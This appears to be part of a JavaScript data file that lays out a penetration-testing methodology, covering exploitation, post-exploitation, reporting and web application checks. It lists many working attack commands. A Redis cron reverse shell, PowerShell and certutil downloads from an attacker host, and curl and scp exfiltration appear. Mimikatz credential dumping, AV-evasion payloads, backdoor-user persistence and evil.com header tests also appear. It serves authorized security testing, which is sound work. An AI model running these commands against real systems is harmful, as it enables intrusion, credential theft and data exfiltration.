        name: "Exploit Database Services",
        description: "Exploit vulnerabilities in exposed database services to gain unauthorized access to data.",
        commands: [
          "mysql -h <target> -u root -p",
          "mssqlclient.py <domain>/<user>:<pass>@<target>",
          "psql -h <target> -U postgres",
          "sqlmap -u '<url>?id=1' --os-shell"
        ],
        tools: ["mysql", "mssqlclient.py (Impacket)", "psql", "SQLMap"],
        expectedOutput: "Database access with ability to read/write data or execute commands"
      },
      {
        name: "Exploit Network Services",
        description: "Exploit vulnerabilities in network services such as FTP, SSH, Telnet, and RDP.",
        commands: [
          "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <target>; exploit'",
          "msfconsole -q -x 'use exploit/linux/ssh/exim_cve_2019_10149_rce; set RHOSTS <target>; exploit'",
          "python3 eternalblue_exploit.py <target>"
        ],
        tools: ["Metasploit", "Custom scripts"],
        expectedOutput: "Remote code execution through network service exploitation"
      },
      {
        name: "Wireless Network Exploitation",
        description: "Exploit wireless network vulnerabilities to gain unauthorized network access.",
        commands: [
          "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture.cap",
          "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
          "bettercap -iface wlan0 -eval 'wifi.recon on; wifi.deauth <bssid>'"
        ],
        tools: ["aircrack-ng", "Hashcat", "Bettercap"],
        expectedOutput: "Cracked wireless credentials and network access"
      },
      {
        name: "Exploit Misconfigurations",
        description: "Leverage identified misconfigurations such as anonymous FTP, default credentials, or open shares.",
        commands: [
          "ftp <target> (anonymous/anonymous)",
          "smbclient //<target>/share -N",
          "rdesktop <target> -u administrator -p password",
          "redis-cli -h <target> CONFIG SET dir /var/spool/cron/ && CONFIG SET dbfilename root && SET payload '\\n*/1 * * * * /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1\\n' && SAVE"
        ],
        tools: ["ftp", "smbclient", "rdesktop", "redis-cli"],
        expectedOutput: "Access gained through misconfigured services"
      },
      {
        name: "Kerberos Attacks",
        description: "Exploit Kerberos authentication weaknesses including AS-REP Roasting, Kerberoasting, and ticket manipulation.",
        commands: [
          "GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -outputfile asrep-hashes.txt",
          "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -outputfile kerberoast-hashes.txt",
          "hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt",
          "hashcat -m 13100 kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt"
        ],
        tools: ["Impacket", "Hashcat", "Rubeus"],
        expectedOutput: "Cracked service account credentials via Kerberos ticket extraction"
      },
      {
        name: "Pass-the-Hash Attacks",
        description: "Use captured NTLM hashes to authenticate to systems without knowing the plaintext password.",
        commands: [
          "crackmapexec smb <target> -u <user> -H <ntlm-hash>",
          "psexec.py <domain>/<user>@<target> -hashes <lm:ntlm>",
          "wmiexec.py <domain>/<user>@<target> -hashes <lm:ntlm>",
          "evil-winrm -i <target> -u <user> -H <ntlm-hash>"
        ],
        tools: ["CrackMapExec", "Impacket", "Evil-WinRM"],
        expectedOutput: "Authenticated shell on target system using pass-the-hash"
      },
      {
        name: "Antivirus Evasion",
        description: "Modify payloads and techniques to bypass antivirus and endpoint detection solutions.",
        commands: [
          "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x64/xor_dynamic -i 5 -f exe -o evasion.exe",
          "nim c -d:mingw --app:gui -o:payload.exe payload.nim",
          "donut -i payload.exe -o payload.bin"
        ],
        tools: ["msfvenom", "Nim", "Donut", "ScareCrow"],
        expectedOutput: "Payload that bypasses target AV/EDR solutions"
      },
      {
        name: "Living Off the Land",
        description: "Use legitimate system binaries and tools (LOLBins) to execute commands and avoid detection.",
        commands: [
          "certutil -urlcache -split -f http://<attacker>/payload.exe payload.exe",
          "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')\"",
          "mshta http://<attacker>/payload.hta",
          "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")"
        ],
        tools: ["certutil", "PowerShell", "mshta", "rundll32", "regsvr32"],
        expectedOutput: "Command execution using built-in Windows binaries"
      },
      {
        name: "Phishing and Social Engineering",
        description: "Conduct targeted phishing campaigns to obtain credentials or deliver payloads to employees.",
        commands: [
          "gophish --admin-listen 0.0.0.0:3333",
          "setoolkit",
          "evilginx2 -p phishlets/"
        ],
        tools: ["GoPhish", "Social Engineering Toolkit", "Evilginx2"],
        expectedOutput: "Captured credentials or executed payloads via social engineering"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 6: Post-Exploitation
  // -------------------------------------------------------------------------
  {
    phase: "Post-Exploitation",
    steps: [
      {
        name: "Situational Awareness",
        description: "Gather information about the compromised system including users, network connections, and installed software.",
        commands: [
          "whoami /all",
          "hostname",
          "ipconfig /all",
          "netstat -ano",
          "systeminfo",
          "tasklist /svc",
          "net user",
          "net localgroup administrators",
          "wmic product get name,version"
        ],
        tools: ["Windows built-in commands"],
        expectedOutput: "Complete system profile including users, network config, and installed software"
      },
      {
        name: "Linux Post-Exploitation Enumeration",
        description: "Gather comprehensive information from a compromised Linux system.",
        commands: [
          "id",
          "uname -a",
          "cat /etc/os-release",
          "ip addr show",
          "ss -tlnp",
          "ps auxww",
          "cat /etc/passwd",
          "cat /etc/crontab",
          "find / -perm -4000 -type f 2>/dev/null",
          "sudo -l"
        ],
        tools: ["Linux built-in commands"],
        expectedOutput: "Complete Linux system profile with potential privilege escalation vectors"
      },
      {
        name: "Credential Harvesting",
        description: "Extract credentials from the compromised system including memory, files, and registry.",
        commands: [
          "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
          "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
          "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<domain> /user:Administrator\" \"exit\"",
          "secretsdump.py <domain>/<user>:<pass>@<target>",
          "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save && reg save HKLM\\SECURITY security.save"
        ],
        tools: ["Mimikatz", "Impacket", "reg"],
        expectedOutput: "Extracted credentials including NTLM hashes, Kerberos tickets, and plaintext passwords"
      },
      {
        name: "Linux Credential Harvesting",
        description: "Extract credentials and sensitive data from compromised Linux systems.",
        commands: [
          "cat /etc/shadow",
          "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
          "find / -name '.bash_history' 2>/dev/null | xargs cat",
          "cat ~/.ssh/id_rsa",
          "find / -name 'wp-config.php' 2>/dev/null | xargs cat",
          "env | grep -iE '(pass|key|secret|token)'",
          "cat /proc/self/environ | tr '\\0' '\\n' | grep -iE '(pass|key|secret)'"
        ],
        tools: ["Linux built-in commands", "find", "grep"],
        expectedOutput: "Extracted password hashes, SSH keys, config file credentials, and environment variables"
      },
      {
        name: "Windows Privilege Escalation",
        description: "Escalate privileges on Windows systems through misconfigurations, unpatched vulnerabilities, or credential abuse.",
        commands: [
          "winpeas.exe quiet fast searchfast",
          "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"",
          "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *",
          "sc qc <vulnerable-service>",
          "icacls \"C:\\Program Files\\<service-path>\"",
          "schtasks /query /fo LIST /v"
        ],
        tools: ["WinPEAS", "PowerUp", "Accesschk", "Windows built-in"],
        expectedOutput: "Identified privilege escalation vector and achieved SYSTEM/Administrator access"
      },
      {
        name: "Linux Privilege Escalation",
        description: "Escalate privileges on Linux systems through SUID binaries, kernel exploits, sudo misconfigurations, or cron jobs.",
        commands: [
          "linpeas.sh",
          "linux-exploit-suggester.sh",
          "sudo -l",
          "find / -perm -4000 -type f 2>/dev/null",
          "cat /etc/crontab && ls -la /etc/cron.*",
          "getcap -r / 2>/dev/null",
          "find / -writable -type f 2>/dev/null | grep -v proc"
        ],
        tools: ["LinPEAS", "linux-exploit-suggester", "GTFOBins reference"],
        expectedOutput: "Identified privilege escalation vector and achieved root access"
      },
      {
        name: "Data Exfiltration",
        description: "Identify and exfiltrate sensitive data from compromised systems using covert channels if necessary.",
        commands: [
          "tar czf /tmp/data.tar.gz /path/to/sensitive/data",
          "base64 /tmp/data.tar.gz > /tmp/data.b64",
          "scp /tmp/data.tar.gz attacker@<ip>:/loot/",
          "curl -X POST -F 'file=@/tmp/data.tar.gz' http://<attacker>:8080/upload",
          "python3 -m http.server 8888"
        ],
        tools: ["tar", "scp", "curl", "Python HTTP server"],
        expectedOutput: "Successfully exfiltrated target data to attacker-controlled infrastructure"
      },
      {
        name: "Lateral Movement",
        description: "Move laterally to other systems on the network using gathered credentials and established trust relationships.",
        commands: [
          "crackmapexec smb <subnet>/24 -u <user> -p <pass> --shares",
          "psexec.py <domain>/<user>:<pass>@<target>",
          "wmiexec.py <domain>/<user>:<pass>@<target>",
          "evil-winrm -i <target> -u <user> -p <pass>",
          "xfreerdp /v:<target> /u:<user> /p:<pass> /dynamic-resolution"
        ],
        tools: ["CrackMapExec", "Impacket", "Evil-WinRM", "xfreerdp"],
        expectedOutput: "Shell access on additional network hosts"
      },
      {
        name: "Persistence Mechanisms",
        description: "Establish persistence on compromised systems to maintain access across reboots and credential changes.",
        commands: [
          "schtasks /create /sc minute /mo 30 /tn \"SystemUpdate\" /tr \"C:\\Windows\\Temp\\payload.exe\" /ru SYSTEM",
          "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Windows\\Temp\\payload.exe",
          "crontab -e  # Add: */30 * * * * /tmp/payload",
          "useradd -M -s /bin/bash -G sudo backdoor && echo 'backdoor:<pass>' | chpasswd",
          "ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key -N '' && cat ~/.ssh/persistence_key.pub >> ~/.ssh/authorized_keys"
        ],
        tools: ["schtasks", "reg", "crontab", "useradd", "ssh-keygen"],
        expectedOutput: "Established persistence mechanism surviving system restarts"
      },
      {
        name: "Internal Network Scanning",
        description: "Scan the internal network from the compromised host to discover additional systems and services.",
        commands: [
          "nmap -sn <internal-range>/24 -oA internal-sweep",
          "nmap -sV -sC -p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,636,993,995,1433,1521,3306,3389,5432,5900,5985,8080 <target> -oA internal-scan",
          "arp -a",
          "net view /domain"
        ],
        tools: ["nmap", "arp", "net"],
        expectedOutput: "Map of internal network with discovered systems and services"
      },
      {
        name: "Active Directory Enumeration",
        description: "Enumerate Active Directory objects, trusts, and group policies from a domain-joined system.",
        commands: [
          "bloodhound-python -d <domain> -u <user> -p <pass> -c all -ns <dc-ip>",
          "ldapdomaindump -u '<domain>\\<user>' -p '<pass>' <dc-ip>",
          "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Get-DomainUser | Export-CSV users.csv\"",
          "adidnsdump -u '<domain>\\<user>' -p '<pass>' <dc-ip>"
        ],
        tools: ["BloodHound", "ldapdomaindump", "PowerView", "adidnsdump"],
        expectedOutput: "Complete Active Directory enumeration with attack paths identified"
      },
      {
        name: "Evidence Collection",
        description: "Collect and preserve evidence of successful exploitation for inclusion in the final report.",
        commands: [
          "screenshot",
          "cat /etc/shadow | head -5",
          "type C:\\Users\\Administrator\\Desktop\\proof.txt",
          "ipconfig /all > evidence-network.txt",
          "whoami /all > evidence-identity.txt"
        ],
        tools: ["Screenshot tools", "Terminal logging"],
        expectedOutput: "Documented evidence of compromise with timestamps and system details"
      },
      {
        name: "Pivot Point Analysis",
        description: "Analyze the compromised system to identify connections to other network segments and high-value targets.",
        commands: [
          "netstat -ano | findstr ESTABLISHED",
          "arp -a",
          "route print",
          "ipconfig /all",
          "net use",
          "net session"
        ],
        tools: ["netstat", "arp", "route", "ipconfig"],
        expectedOutput: "Identified pivot points and network segments accessible from the compromised host"
      },
      {
        name: "Cleanup Preparation",
        description: "Document all changes made to systems during testing for cleanup during the decommissioning phase.",
        commands: [],
        tools: ["Note-taking tools"],
        expectedOutput: "Complete log of all system modifications including accounts created, files dropped, and services modified"
      },
      {
        name: "Domain Escalation",
        description: "Escalate privileges within the Active Directory domain toward Domain Admin or Enterprise Admin access.",
        commands: [
          "secretsdump.py <domain>/<user>:<pass>@<dc-ip>",
          "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<domain> /all\" \"exit\"",
          "ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> administrator",
          "export KRB5CCNAME=administrator.ccache && psexec.py <domain>/administrator@<dc> -k -no-pass"
        ],
        tools: ["Impacket", "Mimikatz", "BloodHound"],
        expectedOutput: "Domain Admin or equivalent access achieved"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 7: Reporting
  // -------------------------------------------------------------------------
  {
    phase: "Reporting",
    steps: [
      {
        name: "Executive Summary",
        description: "Write a high-level executive summary describing the engagement objectives, key findings, and overall security posture.",
        commands: [],
        tools: ["Word processor", "Report templates"],
        expectedOutput: "1-2 page executive summary suitable for non-technical stakeholders"
      },
      {
        name: "Technical Findings Documentation",
        description: "Document each vulnerability with detailed technical information including reproduction steps and evidence.",
        commands: [],
        tools: ["Word processor", "Screenshot tools", "Report templates"],
        expectedOutput: "Detailed vulnerability write-ups with CVSS scores, evidence, and reproduction steps"
      },
      {
        name: "Risk Rating Assignment",
        description: "Assign risk ratings to each finding using CVSS v3.1 and organizational context to determine business impact.",
        commands: [],
        tools: ["CVSS v3.1 Calculator"],
        expectedOutput: "Risk-rated findings with CVSS base, temporal, and environmental scores"
      },
      {
        name: "Remediation Recommendations",
        description: "Provide specific, actionable remediation recommendations for each identified vulnerability.",
        commands: [],
        tools: ["Vendor documentation", "Security best practice guides"],
        expectedOutput: "Detailed remediation steps for each finding with priority and estimated effort"
      },
      {
        name: "Attack Narrative",
        description: "Write a chronological narrative describing the attack path from initial reconnaissance to objectives achieved.",
        commands: [],
        tools: ["Word processor", "Diagram tools"],
        expectedOutput: "Step-by-step attack narrative with supporting evidence and timeline"
      },
      {
        name: "Evidence Compilation",
        description: "Compile and organize all evidence including screenshots, command output, and captured data.",
        commands: [
          "find /root/engagements/<client>/evidence/ -type f | sort",
          "sha256sum /root/engagements/<client>/evidence/* > evidence-hashes.txt"
        ],
        tools: ["find", "sha256sum", "Image editors"],
        expectedOutput: "Organized evidence archive with integrity hashes"
      },
      {
        name: "Network Diagram Creation",
        description: "Create network diagrams showing the tested infrastructure, attack paths, and pivot points.",
        commands: [],
        tools: ["draw.io", "Visio", "PlantUML"],
        expectedOutput: "Network diagrams illustrating infrastructure layout and attack paths"
      },
      {
        name: "Findings Matrix",
        description: "Create a summary matrix of all findings with severity, status, and affected systems for quick reference.",
        commands: [],
        tools: ["Spreadsheet", "Report templates"],
        expectedOutput: "Tabular summary of all findings sortable by severity and affected system"
      },
      {
        name: "Cleanup Documentation",
        description: "Document all cleanup activities performed to restore systems to their pre-test state.",
        commands: [
          "schtasks /delete /tn \"SystemUpdate\" /f",
          "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /f",
          "userdel backdoor",
          "rm /tmp/payload",
          "crontab -r"
        ],
        tools: ["schtasks", "reg", "userdel", "rm", "crontab"],
        expectedOutput: "Documented cleanup of all artifacts, accounts, and modifications from testing"
      },
      {
        name: "Quality Assurance Review",
        description: "Perform internal quality assurance review of the report before delivery to the client.",
        commands: [],
        tools: ["QA checklist", "Peer review"],
        expectedOutput: "Reviewed and approved report ready for client delivery"
      },
      {
        name: "Client Presentation Preparation",
        description: "Prepare presentation materials for the findings walkthrough meeting with the client.",
        commands: [],
        tools: ["Presentation software"],
        expectedOutput: "Slide deck summarizing key findings, attack paths, and remediation priorities"
      },
      {
        name: "Secure Report Delivery",
        description: "Deliver the final report to the client through a secure channel with appropriate encryption.",
        commands: [
          "gpg --encrypt --recipient <client-key-id> final-report.pdf",
          "sha256sum final-report.pdf.gpg"
        ],
        tools: ["GPG", "Secure file transfer"],
        expectedOutput: "Encrypted report delivered to client with integrity verification"
      },
      {
        name: "Evidence Destruction",
        description: "Securely destroy all client data and evidence after the agreed retention period.",
        commands: [
          "shred -vfz -n 5 /root/engagements/<client>/evidence/*",
          "srm -r /root/engagements/<client>/",
          "veracrypt --dismount /root/engagements/<client>/sensitive.hc"
        ],
        tools: ["shred", "srm", "VeraCrypt"],
        expectedOutput: "Verified destruction of all client data and evidence"
      },
      {
        name: "Lessons Learned",
        description: "Document lessons learned from the engagement to improve future testing methodology and tooling.",
        commands: [],
        tools: ["Note-taking tools"],
        expectedOutput: "Internal lessons learned document for team knowledge sharing"
      },
      {
        name: "Retest Planning",
        description: "Assist the client in planning a retest engagement to verify remediation of identified vulnerabilities.",
        commands: [],
        tools: ["Project planning tools"],
        expectedOutput: "Retest scope and timeline aligned with client remediation schedule"
      }
    ]
  }
];

// -----------------------------------------------------------------------------
// 2. WEB_APP_METHODOLOGY -- Web Application Testing (10 categories)
// -----------------------------------------------------------------------------

const WEB_APP_METHODOLOGY = [
  // -------------------------------------------------------------------------
  // Category 1: Information Gathering
  // -------------------------------------------------------------------------
  {
    category: "Info Gathering",
    checks: [
      {
        name: "Web Server Fingerprinting",
        description: "Identify the web server software, version, and configuration through HTTP headers and response behavior.",
        tools: ["curl", "whatweb", "nmap"],
        payload: "curl -sI https://<target>/ | grep -iE '^(Server|X-Powered-By|X-AspNet)'",
        expectedResult: "Web server type and version identified from response headers"
      },
      {
        name: "Application Framework Detection",
        description: "Identify the application framework, programming language, and CMS through fingerprinting techniques.",
        tools: ["Wappalyzer", "WhatWeb", "BuiltWith"],
        payload: "whatweb -a 3 https://<target>/",
        expectedResult: "Detected frameworks, libraries, and CMS platforms"
      },
      {
        name: "Web Application Firewall Detection",
        description: "Detect the presence of a WAF and identify the vendor to adjust testing techniques accordingly.",
        tools: ["wafw00f", "nmap"],
        payload: "wafw00f https://<target>/",
        expectedResult: "WAF vendor and type identified or absence confirmed"
      },
      {
        name: "Robots.txt and Sitemap Analysis",
        description: "Review robots.txt and sitemap.xml for hidden directories, sensitive paths, and site structure information.",
        tools: ["curl", "wget"],
        payload: "curl -s https://<target>/robots.txt && curl -s https://<target>/sitemap.xml",
        expectedResult: "Discovered disallowed paths and complete URL list from sitemap"
      },
      {
        name: "HTTP Methods Testing",
        description: "Test for enabled HTTP methods including dangerous methods like PUT, DELETE, TRACE, and CONNECT.",
        tools: ["curl", "nmap"],
        payload: "curl -s -X OPTIONS https://<target>/ -I | grep 'Allow:'",
        expectedResult: "List of enabled HTTP methods with identification of dangerous methods"
      },
      {
        name: "HTTP Strict Transport Security",
        description: "Verify HSTS header presence and configuration to prevent protocol downgrade attacks.",
        tools: ["curl", "testssl.sh"],
        payload: "curl -sI https://<target>/ | grep -i 'Strict-Transport-Security'",
        expectedResult: "HSTS header present with appropriate max-age and includeSubDomains directives"
      },
      {
        name: "Content Security Policy Analysis",
        description: "Analyze the Content-Security-Policy header for weaknesses that could enable XSS or data injection attacks.",
        tools: ["curl", "CSP Evaluator"],
        payload: "curl -sI https://<target>/ | grep -i 'Content-Security-Policy'",
        expectedResult: "CSP header analyzed for unsafe-inline, unsafe-eval, and overly permissive sources"
      },
      {
        name: "Security Headers Assessment",
        description: "Check for the presence and correct configuration of all security-related HTTP response headers.",
        tools: ["curl", "securityheaders.com"],
        payload: "curl -sI https://<target>/ | grep -iE '^(X-Frame-Options|X-Content-Type-Options|X-XSS-Protection|Referrer-Policy|Permissions-Policy|Cross-Origin)'",
        expectedResult: "Complete security header assessment with missing or misconfigured headers identified"
      },
      {
        name: "Application Entry Points Mapping",
        description: "Map all entry points of the application including forms, API endpoints, file uploads, and parameter inputs.",
        tools: ["Burp Suite", "ZAP", "Katana"],
        payload: "katana -u https://<target>/ -d 5 -jc -ef css,png,jpg,gif,svg,woff -o endpoints.txt",
        expectedResult: "Complete map of application entry points with parameter types and methods"
      },
      {
        name: "JavaScript Analysis",
        description: "Analyze client-side JavaScript for hardcoded secrets, API endpoints, hidden functionality, and source maps.",
        tools: ["LinkFinder", "SecretFinder", "JSParser"],
        payload: "python3 linkfinder.py -i https://<target>/main.js -o cli",
        expectedResult: "Discovered API endpoints, secrets, and hidden parameters from JavaScript files"
      },
      {
        name: "Error Page Analysis",
        description: "Trigger application errors to discover technology stack information, debug settings, and internal paths.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s https://<target>/nonexistent-path-12345 && curl -s 'https://<target>/?id=1%27'",
        expectedResult: "Error messages revealing framework version, file paths, or database details"
      },
      {
        name: "Comment and Metadata Review",
        description: "Review HTML source code for developer comments, metadata, version information, and TODO notes.",
        tools: ["curl", "grep", "Burp Suite"],
        payload: "curl -s https://<target>/ | grep -E '<!--|TODO|FIXME|HACK|BUG|XXX|password|secret|key|token'",
        expectedResult: "Developer comments, debug information, or exposed secrets in HTML source"
      },
      {
        name: "API Documentation Discovery",
        description: "Discover API documentation endpoints such as Swagger/OpenAPI, GraphQL introspection, and WADL files.",
        tools: ["ffuf", "curl"],
        payload: "ffuf -u https://<target>/FUZZ -w api-docs-wordlist.txt -mc 200 -t 20",
        expectedResult: "Discovered API documentation revealing available endpoints and methods"
      },
      {
        name: "Cookie Analysis",
        description: "Analyze cookies for security attributes including Secure, HttpOnly, SameSite, and appropriate expiration.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -sI https://<target>/ | grep -i 'Set-Cookie'",
        expectedResult: "Cookie analysis showing missing security flags and overly broad scope"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 2: Configuration Testing
  // -------------------------------------------------------------------------
  {
    category: "Config Testing",
    checks: [
      {
        name: "SSL/TLS Configuration",
        description: "Test SSL/TLS configuration for weak protocols, ciphers, and certificate issues.",
        tools: ["testssl.sh", "sslscan", "sslyze"],
        payload: "testssl.sh --severity HIGH https://<target>/",
        expectedResult: "TLS 1.2+ only, no weak ciphers, valid certificate chain, HSTS enabled"
      },
      {
        name: "Default Credentials Testing",
        description: "Test for default credentials on administrative interfaces, databases, and management consoles.",
        tools: ["Nuclei", "Hydra", "Burp Suite"],
        payload: "nuclei -u https://<target>/ -t http/default-logins/ -o default-creds.txt",
        expectedResult: "No default credentials found on any accessible interface"
      },
      {
        name: "Directory Listing Enabled",
        description: "Check for directory listing being enabled on web server directories which may expose sensitive files.",
        tools: ["curl", "Gobuster"],
        payload: "curl -s https://<target>/images/ | grep -i 'index of'",
        expectedResult: "Directory listing disabled on all directories"
      },
      {
        name: "Backup and Unreferenced Files",
        description: "Search for backup files, old configurations, and unreferenced files that may contain sensitive information.",
        tools: ["ffuf", "Gobuster"],
        payload: "ffuf -u https://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt -mc 200 -o backups.json",
        expectedResult: "No accessible backup or temporary files found"
      },
      {
        name: "HTTP Request Smuggling",
        description: "Test for HTTP request smuggling vulnerabilities caused by discrepancies between front-end and back-end server parsing.",
        tools: ["Burp Suite", "smuggler"],
        payload: "python3 smuggler.py -u https://<target>/ -m POST",
        expectedResult: "No request smuggling vulnerabilities identified"
      },
      {
        name: "CORS Misconfiguration",
        description: "Test Cross-Origin Resource Sharing configuration for overly permissive policies that could allow cross-origin data theft.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s -H 'Origin: https://evil.com' https://<target>/api/data -I | grep -i 'Access-Control'",
        expectedResult: "CORS policy restricts origins to trusted domains, no wildcard with credentials"
      },
      {
        name: "Cache Poisoning",
        description: "Test for web cache poisoning vulnerabilities through unkeyed headers and parameter manipulation.",
        tools: ["Burp Suite", "curl"],
        payload: "curl -s -H 'X-Forwarded-Host: evil.com' https://<target>/ | grep 'evil.com'",
        expectedResult: "No cache poisoning vectors identified"
      },
      {
        name: "Server-Side Configuration Review",
        description: "Check for exposed server configuration files that may reveal sensitive settings or credentials.",
        tools: ["ffuf", "curl"],
        payload: "ffuf -u https://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200 -fc 404 -fs 0",
        expectedResult: "No exposed configuration files (web.config, .htaccess, php.ini, etc.)"
      },
      {
        name: "HTTP Host Header Injection",
        description: "Test for Host header injection vulnerabilities that could lead to password reset poisoning or cache poisoning.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s -H 'Host: evil.com' https://<target>/password-reset -d 'email=test@test.com'",
        expectedResult: "Application does not use Host header in generated links"
      },
      {
        name: "File Extension Handling",
        description: "Test how the server handles different file extensions including potential bypasses for upload restrictions.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s https://<target>/test.php.bak && curl -s https://<target>/test.php%00.jpg",
        expectedResult: "Server properly handles all file extensions without executing unintended content"
      },
      {
        name: "Subdomain Takeover Testing",
        description: "Check for dangling DNS records pointing to deprovisioned cloud services that could be claimed by an attacker.",
        tools: ["subjack", "nuclei", "can-i-take-over-xyz"],
        payload: "subjack -w subdomains.txt -t 100 -timeout 30 -o takeover-results.txt -ssl",
        expectedResult: "No subdomain takeover vulnerabilities found"
      },
      {
        name: "Content Type Validation",
        description: "Test whether the server validates Content-Type headers and rejects requests with unexpected content types.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s -X POST -H 'Content-Type: application/xml' -d '<test>data</test>' https://<target>/api/endpoint",
        expectedResult: "Server rejects unexpected content types with appropriate error responses"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 3: Authentication Testing
  // -------------------------------------------------------------------------
  {
    category: "Auth Testing",
    checks: [
      {
        name: "Credential Bruteforcing",
        description: "Test login endpoints for resistance to credential bruteforce attacks including rate limiting and lockout mechanisms.",
        tools: ["Hydra", "Burp Suite Intruder", "ffuf"],
        payload: "hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'",
        expectedResult: "Account lockout or rate limiting triggers after 3-5 failed attempts"
      },
      {
        name: "Password Reset Mechanism",
        description: "Test the password reset functionality for token predictability, expiration, and reuse vulnerabilities.",
        tools: ["Burp Suite", "curl"],
        payload: "curl -s -X POST https://<target>/api/password-reset -d 'email=test@test.com' -v",
        expectedResult: "Reset tokens are cryptographically random, expire quickly, and are single-use"
      },
      {
        name: "Multi-Factor Authentication Bypass",
        description: "Test MFA implementation for bypass vulnerabilities including response manipulation, code reuse, and race conditions.",
        tools: ["Burp Suite", "curl"],
        payload: "Test MFA flow: skip step, manipulate response, reuse code, try default codes (000000, 123456)",
        expectedResult: "MFA cannot be bypassed through response manipulation or code reuse"
      },
      {
        name: "Session Token Generation",
        description: "Analyze session token entropy, predictability, and generation algorithm for potential session hijacking.",
        tools: ["Burp Suite Sequencer", "curl"],
        payload: "Collect 10000+ session tokens and analyze with Burp Sequencer",
        expectedResult: "Session tokens have sufficient entropy (>64 bits) and are not predictable"
      },
      {
        name: "Remember Me Functionality",
        description: "Test 'Remember Me' or persistent login functionality for insecure token storage and session management.",
        tools: ["Burp Suite", "Browser DevTools"],
        payload: "Analyze remember-me token: check if predictable, check expiration, test on different IP",
        expectedResult: "Remember-me tokens are cryptographically secure with appropriate expiration"
      },
      {
        name: "Account Enumeration",
        description: "Test login, registration, and password reset endpoints for username/email enumeration through response differences.",
        tools: ["ffuf", "Burp Suite"],
        payload: "ffuf -u https://<target>/login -X POST -d 'username=FUZZ&password=test' -w users.txt -fr 'Invalid password' -mc all",
        expectedResult: "Consistent error messages that do not reveal whether an account exists"
      },
      {
        name: "OAuth/OIDC Implementation",
        description: "Test OAuth and OpenID Connect implementations for redirect URI manipulation, state parameter bypass, and token theft.",
        tools: ["Burp Suite", "curl"],
        payload: "Modify redirect_uri, remove state parameter, test open redirect in callback",
        expectedResult: "OAuth flow properly validates redirect_uri, enforces state parameter, and uses PKCE"
      },
      {
        name: "JWT Token Security",
        description: "Analyze JWT tokens for algorithm confusion, weak signing keys, missing expiration, and sensitive data exposure.",
        tools: ["jwt_tool", "Burp Suite", "jwt.io"],
        payload: "python3 jwt_tool.py <token> -M at -t https://<target>/api/profile -rh 'Authorization: Bearer'",
        expectedResult: "JWT uses strong algorithm (RS256+), has proper expiration, and no sensitive data in payload"
      },
      {
        name: "Default or Weak Credentials",
        description: "Test for default, weak, or commonly used credentials across all authentication interfaces.",
        tools: ["Nuclei", "Hydra", "CrackMapExec"],
        payload: "nuclei -u https://<target>/ -t http/default-logins/ -severity critical,high",
        expectedResult: "No default or weak credentials found"
      },
      {
        name: "Password Complexity Requirements",
        description: "Test password policy enforcement including minimum length, complexity requirements, and common password prevention.",
        tools: ["Burp Suite", "curl"],
        payload: "Test registration with: '123456', 'password', 'a', '<blank>', '<username>'",
        expectedResult: "Password policy enforces minimum 12 characters with complexity and blocks common passwords"
      },
      {
        name: "Credential Transport Security",
        description: "Verify that credentials are only transmitted over encrypted connections and not exposed in URLs or logs.",
        tools: ["Burp Suite", "Wireshark"],
        payload: "Check login form action URL, test HTTP to HTTPS redirect, check for credentials in GET parameters",
        expectedResult: "Credentials only sent via POST over HTTPS, never in URL parameters"
      },
      {
        name: "Logout Functionality",
        description: "Test that logout properly invalidates server-side sessions and tokens, preventing session reuse.",
        tools: ["Burp Suite", "curl"],
        payload: "After logout, replay the session token: curl -s -H 'Cookie: session=<old-token>' https://<target>/profile",
        expectedResult: "Session completely invalidated on server side after logout"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 4: Session Management
  // -------------------------------------------------------------------------
  {
    category: "Session Mgmt",
    checks: [
      {
        name: "Session Fixation",
        description: "Test whether the application is vulnerable to session fixation by accepting attacker-supplied session IDs.",
        tools: ["Burp Suite", "curl"],
        payload: "Set a known session token before authentication and check if it persists after login",
